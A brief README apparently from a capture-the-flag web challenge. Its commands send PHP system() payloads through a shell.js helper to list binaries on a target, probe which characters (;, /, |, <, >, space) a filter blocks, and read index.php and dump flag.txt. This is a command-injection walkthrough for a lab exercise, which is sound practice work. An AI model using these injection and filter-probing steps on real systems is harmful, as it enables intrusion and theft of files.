# README

## Note
```bash
$ node ../web1-nani/scripts/shell.js "system(\"cd \/bin && ls\");" > files/cli-dicts.txt
$ node ../web1-nani/scripts/shell.js "system(\"cd \/usr\/bin && ls\");" >> files/cli-dicts.txt
$ node ../web1-nani/scripts/shell.js "system(\"cd \/usr\/local\/bin && ls\");" >> files/cli-dicts.txt
```

```bash
$ cat files/cli-dict.txt | node scripts/scan-cli.js > files/scan-cli.log
```

```bash
$ node scripts/scan-char.js > files/scan-char.log
```

```text
...
; code(59)
POST[a] 这次我们玩过滤好了。危险
...
/ code(47)
POST[a] 这次我们玩过滤好了。危险
...
| code(124)
POST[a] 这次我们玩过滤好了。危险
< code(60)
POST[a] 这次我们玩过滤好了。危险
> code(62)
POST[a] 这次我们玩过滤好了。危险
...
  code(32)
POST[a] 这次我们玩过滤好了。危险
...
```

```bash
$ node scripts/read.js index.php
$ node scripts/read.js flag.txt > files/dump_flag.txt
```
